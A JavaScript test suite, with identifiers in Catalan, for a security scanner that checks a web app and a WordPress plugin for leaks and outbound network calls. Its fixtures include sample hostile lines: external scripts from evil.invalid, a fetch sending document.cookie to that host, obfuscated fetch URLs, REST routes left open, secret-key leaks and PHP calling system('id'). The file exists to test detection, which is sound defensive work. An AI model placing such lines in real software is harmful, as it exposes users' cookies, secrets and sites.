    'index.html': '<!doctype html><html><head><link rel="icon" type="image/png" href="/icona-192.png"><!-- <script src="https://evil.invalid/x.js"></script> --></head></html>\n',
  }, (dir) => {
    const res = avaluaPerimetreTellado(dir);
    assert.equal(res.ok, true, JSON.stringify(res.infraccions));
    assert.ok(res.desconeguts.some((d) => d.tipus === 'SIGNATURA_EN_COMENTARI'));
  });
});

test('R26-r2 · cost de l\'inventari d\'embornals: 2 MiB de «fetch(» o «import(» són lineals', () => {
  for (const cos of ['fetch(', 'import(', "fetch('"]) {
    const t0 = performance.now();
    ambFixture({ 'src/Embornals.js': cos.repeat(Math.floor((2 * 1024 * 1024) / cos.length)) }, (dir) => {
      const res = avaluaPerimetreTellado(dir);
      assert.ok(res.desconegutsTruncats);
    });
    const ms = performance.now() - t0;
    // Abans: ~2,6 s per a 2 MiB (fins a 4096 caràcters per aparició). Ara: ~0,2 s.
    assert.ok(ms < 1500, `${JSON.stringify(cos)}: ${ms.toFixed(0)} ms`);
  }
});

test('R26-r2 · WP-02: una cadena que imita «\'permission_callback\' =>» no compensa un endpoint, ni un closure que sempre torna cert', () => {
  const ruta = (cos) => `<?php\ndefined( 'ABSPATH' ) || exit;\n${cos}\n`;
  for (const [nom, cos] of [
    ['imitacio', "register_rest_route( 'sdp/v1', '/r', array(\n  array( 'methods' => 'GET', 'callback' => 'sdp_a', 'permission_callback' => 'sdp_pot' ),\n  array( 'methods' => 'POST', 'callback' => 'sdp_b', 'summary' => \"'permission_callback' => cap\" ),\n) );"],
    ['closure', "register_rest_route( 'sdp/v1', '/r', array( 'methods' => 'POST', 'callback' => 'sdp_b', 'permission_callback' => function () { return true; } ) );"],
    ['fletxa', "register_rest_route( 'sdp/v1', '/r', array( 'methods' => 'POST', 'callback' => 'sdp_b', 'permission_callback' => fn() => true ) );"],
    ['cadena-de-crida', "$doc = \"register_rest_route( 'sdp/v1', '/x', array( 'permission_callback' => 'sdp_pot' ) )\";\nregister_rest_route( 'sdp/v1', '/r', array( 'methods' => 'POST', 'callback' => 'sdp_b' ) );"],
  ]) {
    ambFixture({ 'wordpress-plugin/includes/rutes.php': ruta(cos) }, (dir) => {
      const res = avaluaPerimetreTellado(dir);
      assert.ok(res.infraccions.some((i) => i.regla === 'TELLADO-WP-02' && i.fitxer === 'wordpress-plugin/includes/rutes.php'), `${nom}: ${JSON.stringify(res.infraccions)}`);
    });
  }
  ambFixture({ 'wordpress-plugin/includes/rutes.php': ruta("register_rest_route( 'sdp/v1', '/r', array( 'methods' => 'POST', 'callback' => 'sdp_b', 'permission_callback' => function () { return current_user_can( 'manage_options' ); } ) );") }, (dir) => {
    assert.ok(!avaluaPerimetreTellado(dir).infraccions.some((i) => i.regla === 'TELLADO-WP-02'));
  });
});

test('R26-r2 · VIG-08: un «;» dins d\'una cadena no talla la sentència i les respostes REST, wp_die o error_log també exposen', () => {
  for (const cos of [
    "echo ';' . WP_SECRETS_KEY;",
    'return new WP_REST_Response( WP_SECRETS_KEY );',
    'return rest_ensure_response( array( "k" => WP_SECRETS_KEY ) );',
    "wp_die( 'x' . WP_SECRETS_KEY );",
    'error_log( WP_SECRETS_KEY );',
    "header( 'X-Clau: ' . WP_SECRETS_KEY );",
  ]) {
    ambFixture({ 'wordpress-plugin/includes/fuita.php': `<?php\ndefined( 'ABSPATH' ) || exit;\n${cos}\n` }, (dir) => {
      const res = avaluaPerimetreTellado(dir);
      assert.ok(res.infraccions.some((i) => i.regla === 'VIG-08'), `${cos}: ${JSON.stringify(res.infraccions)}`);
    });
  }
  ambFixture({ 'wordpress-plugin/includes/net.php': "<?php\ndefined( 'ABSPATH' ) || exit;\necho esc_html( ';' . $text );\n$ok = defined( 'WP_SECRETS_KEY' );\n" }, (dir) => {
    assert.ok(!avaluaPerimetreTellado(dir).infraccions.some((i) => i.regla === 'VIG-08'));
  });
});

test('R26-r2 · VIG-07: una cadena que anomena 503, Retry-After, no-store i robots.txt no fa bo un manteniment que respon 200', () => {
  ambFixture({
    'wordpress-plugin/eines/amfitrio/sdp-manteniment-503-mu-plugin.php': "<?php\ndefined( 'ABSPATH' ) || exit;\necho '503 Service Unavailable. Retry-After: 3600 no-store robots.txt';\n",
  }, (dir) => {
    const vig07 = avaluaPerimetreTellado(dir).infraccions.find((i) => i.regla === 'VIG-07');
    assert.ok(vig07, 'Ha de faltar la crida real de 503');
    assert.match(vig07.missatge, /503, Retry-After, no-store/);
    assert.equal(vig07.ambit, 'exemple-amfitrio');
  });
  ambFixture({
    'wordpress-plugin/eines/amfitrio/sdp-manteniment-503-mu-plugin.php': "<?php\ndefined( 'ABSPATH' ) || exit;\nif ( ! is_robots() ) {\n  status_header( 503 );\n  nocache_headers();\n  header( 'Retry-After: 600' );\n  exit;\n}\n",
  }, (dir) => {
    assert.ok(!avaluaPerimetreTellado(dir).infraccions.some((i) => i.regla === 'VIG-07'));
  });
});

test('R26-r2 · l\'exempció .l10n.php només val per a dades pures, no per a expressions executables', () => {
  for (const cos of [
    "<?php return array( 'x' => file_put_contents( '/tmp/p', 'y' ) );",
    '<?php return array( \'x\' => "{$_GET[\'a\']}" );',
    "<?php return array( 'x' => `id` );",
    "<?php return array( 'x' => PHP_VERSION );",
  ]) {
    ambFixture({ 'wordpress-plugin/languages/socdepoble-xx.l10n.php': `${cos}\n` }, (dir) => {
      assert.ok(avaluaPerimetreTellado(dir).infraccions.some((i) => i.regla === 'TELLADO-WP-01'), cos);
    });
  }
  ambFixture({ 'wordpress-plugin/languages/socdepoble-xx.l10n.php': "<?php\nreturn array( 'domain' => 'socdepoble', 'plural-forms' => 'nplurals=2; plural=n != 1;', 'messages' => array( 'Hi' => \"Hola\", 'n' => 2, 'b' => true ) );\n" }, (dir) => {
    assert.ok(!avaluaPerimetreTellado(dir).infraccions.some((i) => i.regla === 'TELLADO-WP-01'));
  });
});

test('R26-r2 · àmbit WP: «distribuit» és el que entra al ZIP (paritat amb ADAPTADOR) i eines/amfitrio és exemple d\'amfitrió', () => {
  assert.deepEqual([...WP_DISTRIBUIT.fitxers], [...ADAPTADOR.fitxers]);
  assert.deepEqual([...WP_DISTRIBUIT.carpetes], [...ADAPTADOR.carpetes]);
  assert.equal(ambitWordPress('wordpress-plugin/eines/amfitrio/sdp-manteniment-503-mu-plugin.php'), 'exemple-amfitrio');
  assert.equal(ambitWordPress('wordpress-plugin/includes/traduccio.php'), 'distribuit');
  assert.equal(ambitWordPress('wordpress-plugin/socdepoble-enxufe.php'), 'distribuit');
  assert.equal(ambitWordPress('wordpress-plugin/eines/altra.php'), 'no-distribuit');
  assert.equal(ambitWordPress('wordpress-plugin/assets/x.php'), 'no-distribuit');
  assert.equal(ambitWordPress('wp-content/maintenance.php'), 'amfitrio-arrel');
  // El mu-plugin real viu fora de la llista blanca del ZIP.
  const muPlugin = 'wordpress-plugin/eines/amfitrio/sdp-manteniment-503-mu-plugin.php';
  if (fs.existsSync(path.join(ARREL_REPO, muPlugin))) assert.equal(ambitWordPress(muPlugin), 'exemple-amfitrio');
});

test('R26-r2 · VIG-09 no exigix includeSubDomains: max-age=31536000 sol passa i un max-age curt no', () => {
  const ambHsts = (valor, cb) => ambFixture({}, (dir) => {
    const cfg = JSON.parse(fs.readFileSync(path.join(dir, 'firebase.json'), 'utf8'));
    cfg.hosting.headers[0].headers = cfg.hosting.headers[0].headers.map((h) => (h.key === 'Strict-Transport-Security' ? { ...h, value: valor } : h));
    fs.writeFileSync(path.join(dir, 'firebase.json'), JSON.stringify(cfg), 'utf8');
    return cb(avaluaPerimetreTellado(dir));
  });
  ambHsts('max-age=31536000', (res) => assert.ok(!res.infraccions.some((i) => i.regla === 'VIG-09'), JSON.stringify(res.infraccions)));
  ambHsts('max-age=1000000', (res) => assert.ok(res.infraccions.some((i) => i.regla === 'VIG-09')));
});

/* ═══════════ Onada R26 · ronda 3: regressions de la ronda 2 i residus P3 ═══════════ */

const infraccionsDe = (res, regla, fitxer) => res.infraccions.filter((i) => i.regla === regla && i.fitxer === fitxer);
const G_PHP = "<?php\ndefined( 'ABSPATH' ) || exit;\n";

test('R26-r3 · atributs: un «src=» dins del valor d\'un altre atribut no amaga el src real (EXF-01/EXF-04), ni en HTML ni en PHP', () => {
  ambFixture({
    'index.html': [
      '<!doctype html><html><head><link rel="icon" type="image/png" href="/icona-192.png">',
      `<script data-x='/src=/ok.js' src="https://evil.invalid/a.js"></script>`,
      `<script data-x='"src=/ok.js' src="https://evil.invalid/b.js"></script>`,
      '<script title="a src=/ok.js" src="https://evil.invalid/c.js"></script>',
      '<iframe title="/src=/ok" src="https://evil.invalid/w"></iframe>',
      // Control: un «/src=» extern dins d'un altre atribut no és el src del navegador.
      `<script data-x='/src=https://cdn.invalid/no.js' src="/src/main.jsx"></script>`,
      '</head></html>',
    ].join('\n'),
    'wordpress-plugin/templates/pagina.php': `${G_PHP}?><script data-x='/src=/ok.js' src="https://evil.invalid/p.js"></script>\n`,
  }, (dir) => {
    const res = avaluaPerimetreTellado(dir);
    assert.deepEqual(infraccionsDe(res, 'TELLADO-EXF-01', 'index.html').map((i) => i.linia), [2, 3, 4], JSON.stringify(res.infraccions));
    assert.deepEqual(infraccionsDe(res, 'TELLADO-EXF-04', 'index.html').map((i) => i.linia), [5], JSON.stringify(res.infraccions));
    assert.equal(infraccionsDe(res, 'TELLADO-EXF-01', 'wordpress-plugin/templates/pagina.php').length, 1, JSON.stringify(res.infraccions));
  });
});

test('R26-r3 · un «>» entre cometes després d\'un valor sense cometes amb apòstrof (a\'b) no talla l\'etiqueta ni perd el src', () => {
  ambFixture({
    'index.html': [
      '<!doctype html><html><head><link rel="icon" type="image/png" href="/icona-192.png">',
      `<script data-x=a'b data-y=">" src="https://evil.invalid/a.js"></script>`,
      `<script data-x=a'b></script><script data-y=">" src="https://evil.invalid/b.js"></script>`,
      '</head></html>',
    ].join('\n'),
    'src/Plantilla.jsx': "export const S = () => <script data-x={`it's >`} src=\"https://evil.invalid/c.js\" />;\n",
    // Un .js també pot portar JSX: la base hi comptava les claus.
    'src/Claus.js': 'export const S = () => <script data-x={a > b} src="https://evil.invalid/d.js" />;\n',
  }, (dir) => {
    const res = avaluaPerimetreTellado(dir);
    assert.deepEqual(infraccionsDe(res, 'TELLADO-EXF-01', 'index.html').map((i) => i.linia), [2, 3], JSON.stringify(res.infraccions));
    assert.equal(infraccionsDe(res, 'TELLADO-EXF-01', 'src/Plantilla.jsx').length, 1, JSON.stringify(res));
    assert.equal(infraccionsDe(res, 'TELLADO-EXF-01', 'src/Claus.js').length, 1, JSON.stringify(res));
  });
});

test('R26-r3 · un bloc PHP dins d\'una etiqueta és opac: ni el «"» ni el «>» que porta amaguen el src', () => {
  ambFixture({
    'wordpress-plugin/templates/a.php': `${G_PHP}?><script data-x="<?php echo '"'; ?>" src="https://evil.invalid/a.js"></script>\n`,
    'wordpress-plugin/templates/b.php': `${G_PHP}?><script <?php echo $atributs; ?> src="https://evil.invalid/b.js"></script>\n`,
  }, (dir) => {
    const res = avaluaPerimetreTellado(dir);
    for (const f of ['wordpress-plugin/templates/a.php', 'wordpress-plugin/templates/b.php']) {
      assert.equal(infraccionsDe(res, 'TELLADO-EXF-01', f).length, 1, `${f}: ${JSON.stringify(res)}`);
    }
  });
});

test('R26-r3 · mode JSX: una paraula clau usada com a identificador o propietat (of, from, obj.default, obj.in) no obri cap element fals', () => {
  ambFixture({
    'src/Of.jsx': 'const of = 0, b = 1; export const z = of <b>fetch("https://evil.invalid/a?c="+document.cookie)</b>/.test("");\n',
    'src/From.jsx': 'const from = 0, b = 1; export const z = from <b>fetch("https://evil.invalid/b")</b>/.test("");\n',
    'src/Default.jsx': 'export const z = obj.default <b>fetch("https://evil.invalid/c")</b>/.test("");\n',
    'src/In.jsx': 'export const z = obj?.in <b>fetch("https://evil.invalid/d")</b>/.test("");\n',
  }, (dir) => {
    const res = avaluaPerimetreTellado(dir);
    for (const f of ['src/Of.jsx', 'src/From.jsx', 'src/Default.jsx', 'src/In.jsx']) {
      assert.ok(desconegutsDe(res, f).some((d) => /^DESTI_XARXA_/.test(d.tipus)), `${f}: ${JSON.stringify(res.desconeguts)}`);
    }
    assert.equal(res.destinsXarxa.coberts, 0);
  });
  // Control: «export default <p>…» i «return <p>…» continuen sent JSX (text sense soroll).
  ambFixture({
    'src/Pagina.jsx': "export default <p>L'home a https://socdepoble.org // text</p>;\nexport const P = () => { return <p>d'aigua: src/*.js</p>; };\n",
  }, (dir) => {
    const res = avaluaPerimetreTellado(dir);
    assert.deepEqual(res.desconeguts, [], JSON.stringify(res.desconeguts));
  });
});

test('R26-r3 · lectures ambigües del lexer: una regex després de «)» d\'un if o una divisió després de «}» no donen «net»', () => {
  ambFixture({
    'src/Regex.js': 'if (x) /\'/.test(y); fetch("https://evil.invalid/x"); //\'\n',
    'src/Divisio.js': 'x = {} / fetch(atob("aHR0cHM6Ly9ldmlsLmludmFsaWQveA==")) / 1\n',
  }, (dir) => {
    const res = avaluaPerimetreTellado(dir);
    assert.ok(desconegutsDe(res, 'src/Regex.js').some((d) => d.tipus === 'EMBORNAL_FORA_DE_CODI'), JSON.stringify(res.desconeguts));
    assert.ok(desconegutsDe(res, 'src/Divisio.js').some((d) => d.tipus === 'EMBORNAL_FORA_DE_CODI'), JSON.stringify(res.desconeguts));
  });
  // Control: divisions i regex normals no marquen res.
  ambFixture({
    'src/Normal.js': "const m = (a + b) / 2 + 'fetch(x) en una cadena';\nif (ok) { y = /^a/.test(z); }\nexport const f = () => fetch('/api/x');\n",
  }, (dir) => {
    assert.deepEqual(avaluaPerimetreTellado(dir).desconeguts, []);
  });
});

test('R26-r3 · cost: molts embornals en un comentari de línia i «<?php echo $a ?>» sense «;» són lineals', () => {
  for (const [nom, fitxers] of [
    ['comentari .js', { 'src/a.js': `// ${'fetch('.repeat(Math.floor((512 * 1024) / 6))}\n` }],
    ['comentari .jsx', { 'src/a.jsx': `// ${'fetch('.repeat(Math.floor((512 * 1024) / 6))}\n` }],
    ['echo ?>', { 'wordpress-plugin/templates/t.php': `${G_PHP}${'<?php echo $a ?>'.repeat(Math.floor((2 * 1024 * 1024) / 16))}` }],
  ]) {
    const t0 = performance.now();
    ambFixture(fitxers, (dir) => { avaluaPerimetreTellado(dir); });
    const ms = performance.now() - t0;
    // Ronda 2: 6,7 s (512 KiB de comentari) i 4,6 s (2 MiB d'echo); ara < 0,3 s.
    assert.ok(ms < 1500, `${nom}: ${ms.toFixed(0)} ms`);
  }
});

test('R26-r3 · cost: el nom d\'una opció sense cometa de tancament no fa retrocedir VIG-08 (heretat de la base)', () => {
  const t0 = performance.now();
  ambFixture({ 'wordpress-plugin/includes/o.php': `${G_PHP}get_option('${'a_key'.repeat(Math.floor((160 * 1024) / 5))}\n` }, (dir) => { avaluaPerimetreTellado(dir); });
  const ms = performance.now() - t0;
  // Base i ronda 2: 49 s per a 512 KiB (quadràtic); ara uns 20 ms.
  assert.ok(ms < 1500, `${ms.toFixed(0)} ms`);
  // Control: la detecció continua igual.
  ambFixture({ 'wordpress-plugin/includes/o.php': `${G_PHP}update_option( 'sdp_api_key', $v );\n$x = get_option( 'sdp_color' );\n` }, (dir) => {
    assert.equal(avaluaPerimetreTellado(dir).infraccions.filter((i) => i.regla === 'VIG-08').length, 1);
  });
});

test('R26-r3 · l\'exempció .l10n.php rebutja qualsevol «(» que no siga d\'array (crides per cadena o per expressió)', () => {
  for (const cos of [
    "<?php return array( 'x' => 'file_put_contents'( '/tmp/p', 'y' ) );",
    "<?php return array( 'x' => ( 'system' )( 'id' ) );",
    "<?php return [ 'x' => [ 'C', 'm' ]( ) ];",
  ]) {
    ambFixture({ 'wordpress-plugin/languages/socdepoble-xx.l10n.php': `${cos}\n` }, (dir) => {
      assert.ok(avaluaPerimetreTellado(dir).infraccions.some((i) => i.regla === 'TELLADO-WP-01'), cos);
    });
  }
  ambFixture({ 'wordpress-plugin/languages/socdepoble-xx.l10n.php': "<?php\nreturn array( 'messages' => array ( 'Hi' => 'Hola' ), 'b' => [ 1, 2 ] );\n" }, (dir) => {
    assert.ok(!avaluaPerimetreTellado(dir).infraccions.some((i) => i.regla === 'TELLADO-WP-01'));
  });
});

test('R26-r3 · EXF-02 amb l\'amfitrió que resol el parser WHATWG (%2E, amplada completa)', () => {
  ambFixture({
    'index.html': [
      '<!doctype html><html><head><link rel="icon" type="image/png" href="/icona-192.png">',
      '<link rel="stylesheet" href="https://fonts%2Egoogleapis%2Ecom/css2?family=Inter">',
      '<link rel="stylesheet" href="https://ｆｏｎｔｓ.googleapis.com/css2?family=Inter">',
      '<link rel="stylesheet" href="/fonts/inter.css">',
      '</head></html>',
    ].join('\n'),
  }, (dir) => {
    const res = avaluaPerimetreTellado(dir);
    assert.deepEqual(infraccionsDe(res, 'TELLADO-EXF-02', 'index.html').map((i) => i.linia), [2, 3], JSON.stringify(res.infraccions));
  });
});

test('R26-r3 · un «<!--» dins de textarea o title (RCDATA) no és un comentari i no rebaixa EXF-01/03', () => {
  ambFixture({
    'index.html': '<!doctype html><html><head><link rel="icon" type="image/png" href="/icona-192.png"><title><!--</title><script src="https://www.googletagmanager.com/gtag/js?id=G-X"></script>--></head><body><textarea><!--</textarea><script src="https://evil.invalid/x.js"></script><textarea>--></textarea></body></html>\n',
  }, (dir) => {
    const res = avaluaPerimetreTellado(dir);
    assert.equal(infraccionsDe(res, 'TELLADO-EXF-01', 'index.html').length, 2, JSON.stringify(res));
    assert.ok(reglesDe(res).has('TELLADO-EXF-03'), JSON.stringify(res.infraccions));
  });
});

test('R26-r3 · <script href> i <script xlink:href> (SVG) externs són EXF-01', () => {
  ambFixture({
    'index.html': [
      '<!doctype html><html><head><link rel="icon" type="image/png" href="/icona-192.png"></head><body>',
      '<svg><script href="https://evil.invalid/a.js"></script></svg>',
      '<svg><script xlink:href="https://evil.invalid/b.js"></script></svg>',
      '<svg><script href="/local.js"></script></svg>',
      '</body></html>',
    ].join('\n'),
  }, (dir) => {
    const res = avaluaPerimetreTellado(dir);
    assert.deepEqual(infraccionsDe(res, 'TELLADO-EXF-01', 'index.html').map((i) => i.linia), [2, 3], JSON.stringify(res.infraccions));
  });
});

test('R26-r3 · VIG-08 amb l\'eco curt «<?= ?>» i WP-02 amb __RETURN_TRUE, «\\\\__return_true» o __return_true(...)', () => {
  ambFixture({ 'wordpress-plugin/templates/t.php': `${G_PHP}?><p><?= WP_SECRETS_KEY ?></p><p><?= esc_html( $t ) ?></p>\n` }, (dir) => {
    assert.equal(avaluaPerimetreTellado(dir).infraccions.filter((i) => i.regla === 'VIG-08').length, 1);
  });
  for (const permis of ["'__RETURN_TRUE'", "'\\\\__return_true'", "'Is_Admin'", '__return_true(...)']) {
    ambFixture({ 'wordpress-plugin/includes/r.php': `${G_PHP}register_rest_route( 'a/v1', '/r', array( 'callback' => 'f', 'permission_callback' => ${permis} ) );\n` }, (dir) => {
      assert.ok(avaluaPerimetreTellado(dir).infraccions.some((i) => i.regla === 'TELLADO-WP-02'), permis);
    });
  }
});

test('R26-r3 · HTML dins d\'una cadena PHP o JS amb cometes escapades (src=\\"…\\") no amaga el destí', () => {
  ambFixture({
    'wordpress-plugin/includes/e.php': `${G_PHP}echo "<script src=\\"https://evil.invalid/a.js\\"></script>";\n`,
    'src/Cadena.js': "export const h = '<script src=\\'https://evil.invalid/b.js\\'></script>';\n",
    // Control: un destí local escapat continua sent local.
    'src/Local.js': 'export const l = "<script src=\\"/src/main.jsx\\"></script>";\n',
  }, (dir) => {
    const res = avaluaPerimetreTellado(dir);
    assert.equal(infraccionsDe(res, 'TELLADO-EXF-01', 'wordpress-plugin/includes/e.php').length, 1, JSON.stringify(res));
    assert.equal(infraccionsDe(res, 'TELLADO-EXF-01', 'src/Cadena.js').length, 1, JSON.stringify(res));
    assert.equal(infraccionsDe(res, 'TELLADO-EXF-01', 'src/Local.js').length, 0, JSON.stringify(res));
  });
});

test('R26-r3 · guarda: la xarxa de seguretat de VIG-08 llig els comentaris crus i la resta amb la màscara de codi', () => {
  ambFixture({
    'wordpress-plugin/includes/comentat.php': `${G_PHP}// echo WP_SECRETS_KEY;\n/* print WP_SECRETS_KEY; */\n$ok = 1;\n`,
    'wordpress-plugin/includes/actiu.php': `${G_PHP}/* nota */ echo ';' . WP_SECRETS_KEY;\n`,
  }, (dir) => {
    const res = avaluaPerimetreTellado(dir);
    const comentats = desconegutsDe(res, 'wordpress-plugin/includes/comentat.php').filter((d) => d.tipus === 'SIGNATURA_EN_COMENTARI' && d.regla === 'VIG-08');
    assert.equal(comentats.length, 2, JSON.stringify(res.desconeguts));
    assert.equal(infraccionsDe(res, 'VIG-08', 'wordpress-plugin/includes/comentat.php').length, 0, JSON.stringify(res.infraccions));
    assert.equal(infraccionsDe(res, 'VIG-08', 'wordpress-plugin/includes/actiu.php').length, 1, JSON.stringify(res.infraccions));
  });
});

/* ═══════════ Onada R26 · ronda 4 del Gauntlet (residus del verificador de la ronda 3) ═══════════ */

const WP_SCRIPT_VER = '<script src="https://cdn.evil.invalid/lib.js?ver=<?php echo esc_attr( $v ); ?>"></script>';

test('R26-r4 · fallada tancada: un src extern amb una plantilla després de l\'amfitrió (${, <?, {{) continua sent EXF-01, com la base', () => {
  ambFixture({
    'wordpress-plugin/templates/ver.php': `${G_PHP}?>${WP_SCRIPT_VER}\n`,
    'wordpress-plugin/includes/ver.php': `${G_PHP}?>${WP_SCRIPT_VER}\n`,
    'src/Plantilla.js': 'export const h = (v) => `<script src="https://evil.invalid/x.js?v=${v}"></script>`;\n',
    'src/Plantilla.jsx': 'export const h = (v) => `<script src="https://evil.invalid/x.js?v=${v}"></script>`;\n',
    'index.html': [
      '<!doctype html><html><head><link rel="icon" type="image/png" href="/icona-192.png">',
      '<script src="//evil.invalid/${v}/x.js"></script>',
      '<script src="https://evil.invalid/{{v}}.js"></script>',
      // Amb el marcador dins de l'amfitrió, el prefix «https://» ja és extern (la base també el marcava).
      '<script src="https://${h}/x.js"></script>',
      '</head></html>',
    ].join('\n'),
    // Control: una plantilla sense amfitrió escrit continua sent desconeguda, no infracció.
    'wordpress-plugin/templates/local.php': `${G_PHP}?><script src="<?php echo esc_url( plugins_url( 'x.js', __FILE__ ) ); ?>"></script>\n`,
    'src/Local.js': 'export const h = (v) => `<script src="/assets/${v}.js"></script>`;\n',
  }, (dir) => {
    const res = avaluaPerimetreTellado(dir);
    for (const f of ['wordpress-plugin/templates/ver.php', 'wordpress-plugin/includes/ver.php', 'src/Plantilla.js', 'src/Plantilla.jsx']) {
      assert.equal(infraccionsDe(res, 'TELLADO-EXF-01', f).length, 1, `${f}: ${JSON.stringify(res)}`);
    }
    assert.deepEqual(infraccionsDe(res, 'TELLADO-EXF-01', 'index.html').map((i) => i.linia), [2, 3, 4], JSON.stringify(res.infraccions));
    for (const f of ['wordpress-plugin/templates/local.php', 'src/Local.js']) {
      assert.equal(infraccionsDe(res, 'TELLADO-EXF-01', f).length, 0, `${f}: ${JSON.stringify(res.infraccions)}`);
      assert.ok(desconegutsDe(res, f).some((d) => d.tipus === 'SCRIPT_SRC_DINAMIC'), `${f}: ${JSON.stringify(res.desconeguts)}`);
    }
  });
});

test('R26-r4 · iframe amb plantilla: un amfitrió complet de la llista blanca o un camí relatiu fix són permesos (com la base); un amfitrió obert, extern o «/» sol és EXF-04', () => {
  ambFixture({
    'wordpress-plugin/templates/video.php': `${G_PHP}?><iframe src="https://www.youtube-nocookie.com/embed/<?php echo esc_attr( $id ); ?>"></iframe>\n`,
    'wordpress-plugin/templates/relatiu.php': `${G_PHP}?><iframe src="//www.youtube-nocookie.com/embed/<?php echo esc_attr( $id ); ?>"></iframe>\n`,
    'src/Video.jsx': 'export const V = ({ id }) => <iframe title="v" src={`https://www.youtube-nocookie.com/embed/${id}`} />;\n',
    // Un camí del mateix origen ja escrit tampoc no el pot canviar cap plantilla.
    'wordpress-plugin/templates/cami.php': `${G_PHP}?><iframe src="/embed/<?php echo esc_attr( $id ); ?>"></iframe>\n`,
    // L'amfitrió encara no és complet: la plantilla el pot allargar o posar-li un «@» davant.
    'wordpress-plugin/templates/obert.php': `${G_PHP}?><iframe src="https://www.youtube-nocookie.com<?php echo $cami; ?>"></iframe>\n`,
    // «/» + «/evil.invalid/x» ja seria un altre origen (la base el permetia).
    'wordpress-plugin/templates/barra.php': `${G_PHP}?><iframe src="/<?php echo $cami; ?>"></iframe>\n`,
    'wordpress-plugin/templates/extern.php': `${G_PHP}?><iframe src="https://evil.invalid/embed/<?php echo esc_attr( $id ); ?>"></iframe>\n`,
    'src/Usuari.jsx': 'export const W = ({ x }) => <iframe title="w" src={`https://${x}@www.youtube-nocookie.com/embed/a`} />;\n',
  }, (dir) => {
    const res = avaluaPerimetreTellado(dir);
    for (const f of ['wordpress-plugin/templates/video.php', 'wordpress-plugin/templates/relatiu.php', 'src/Video.jsx', 'wordpress-plugin/templates/cami.php']) {
      assert.equal(infraccionsDe(res, 'TELLADO-EXF-04', f).length, 0, `${f}: ${JSON.stringify(res.infraccions)}`);
    }
    for (const f of ['wordpress-plugin/templates/obert.php', 'wordpress-plugin/templates/barra.php', 'wordpress-plugin/templates/extern.php', 'src/Usuari.jsx']) {
      assert.equal(infraccionsDe(res, 'TELLADO-EXF-04', f).length, 1, `${f}: ${JSON.stringify(res.infraccions)}`);
    }
  });
});

test('R26 · iframe amb plantilla: un prefix que acaba en una referència de caràcter incompleta no és un camí relatiu fix (EXF-04)', () => {
  ambFixture({
    // «&» + «#47;/evil.invalid/» seria «//evil.invalid/»; «j&» + «#97;vascript:» seria «javascript:».
    'wordpress-plugin/templates/amp.php': `${G_PHP}?><iframe src="&<?php echo $x; ?>"></iframe>\n`,
    'wordpress-plugin/templates/amp-hash.php': `${G_PHP}?><iframe src="&#<?php echo $x; ?>"></iframe>\n`,
    'wordpress-plugin/templates/amp-j.php': `${G_PHP}?><iframe src="j&<?php echo $x; ?>"></iframe>\n`,
    'src/Amp.jsx': 'export const A = ({ x }) => <iframe title="a" src={`ht&${x}`} />;\n',
    // Control: un camí del mateix origen ja escrit continua sent permés.
    'wordpress-plugin/templates/cami.php': `${G_PHP}?><iframe src="/embed/<?php echo esc_attr( $id ); ?>"></iframe>\n`,
  }, (dir) => {
    const res = avaluaPerimetreTellado(dir);
    for (const f of ['wordpress-plugin/templates/amp.php', 'wordpress-plugin/templates/amp-hash.php', 'wordpress-plugin/templates/amp-j.php', 'src/Amp.jsx']) {
      assert.equal(infraccionsDe(res, 'TELLADO-EXF-04', f).length, 1, `${f}: ${JSON.stringify(res.infraccions)}`);
    }
    assert.equal(infraccionsDe(res, 'TELLADO-EXF-04', 'wordpress-plugin/templates/cami.php').length, 0, JSON.stringify(res.infraccions));
  });
});

test('R26-r4 · lexer: després del punt decimal («1.») o d\'un spread («...») una paraula clau no és un nom de propietat (i després del spread una «/» és una regex)', () => {
  const casos = {
    Decimal: 'const k = 1. in /\'/; fetch("https://evil.invalid/x"); //\'\n',
    Spread: '[...typeof /\'/]; fetch("https://evil.invalid/x"); //\'\n',
    Await: '[...await /\'/.exec("\'")]; fetch("https://evil.invalid/x"); //\'\n',
    // Heretat de la base: després del spread, una «/» és una regex, mai una divisió.
    RegexSpread: '[.../\'/]; fetch("https://evil.invalid/x"); //\'\n',
  };
  const fitxers = {};
  for (const [nom, codi] of Object.entries(casos)) {
    fitxers[`src/${nom}.js`] = codi;
    fitxers[`src/${nom}.jsx`] = codi;
  }
  ambFixture(fitxers, (dir) => {
    const res = avaluaPerimetreTellado(dir);
    for (const f of Object.keys(fitxers)) {
      assert.ok(desconegutsDe(res, f).some((d) => /^DESTI_XARXA_/.test(d.tipus)), `${f}: ${JSON.stringify(res.desconeguts)}`);
    }
  });
  // Control: decimals, hexadecimals, «1..x», spreads i atributs spread JSX normals no fan soroll.
  ambFixture({
    'src/Numeros.js': "const a = 1.5 / 2, b = 0x1F.toString(16) / 1, c = 1..toFixed(1) / 3, d = [...xs].length / 2;\nexport const f = () => fetch('/api/x');\n",
    'src/Spread.jsx': "export const L = (xs, props) => [...xs].map((x) => <p key={x} {...props}>d'aigua: src/*.js</p>);\n",
  }, (dir) => {
    assert.deepEqual(avaluaPerimetreTellado(dir).desconeguts, []);
  });
});
